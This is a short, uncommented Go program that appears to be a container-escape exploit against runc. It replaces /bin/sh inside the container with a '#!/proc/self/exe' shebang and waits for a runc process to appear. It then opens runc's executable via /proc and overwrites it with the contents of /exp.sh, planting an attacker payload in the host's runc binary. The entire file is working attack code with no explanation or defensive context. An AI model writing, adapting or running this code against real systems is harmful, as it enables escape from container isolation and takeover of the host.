package main

import (
    "io/ioutil"
    "os"
    "strconv"
    "bytes"
)

func main() {
    payload, _ := ioutil.ReadFile("/exp.sh")
    ioutil.WriteFile("/bin/sh", []byte("#!/proc/self/exe"), 0755)

    pid := ""
    for pid == "" {
        pids, _ := ioutil.ReadDir("/proc")

        for _, f := range pids {
            cmdline, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            if bytes.Contains(cmdline, []byte("runc")) {
                pid = f.Name()
                break
            }
        }
    }

    exefd := ""
    for {
        exe, _ := os.Open("/proc/"+pid+"/exe")
        if int(exe.Fd()) > 0 {
            exefd = strconv.Itoa(int(exe.Fd()))
            break
        }
    }

    for {
        writefd, _ := os.OpenFile("/proc/self/fd/"+exefd, os.O_WRONLY|os.O_TRUNC, 0755)
        if int(writefd.Fd()) > 0 {
            writefd.Write(payload)
            break
        }
    }
}
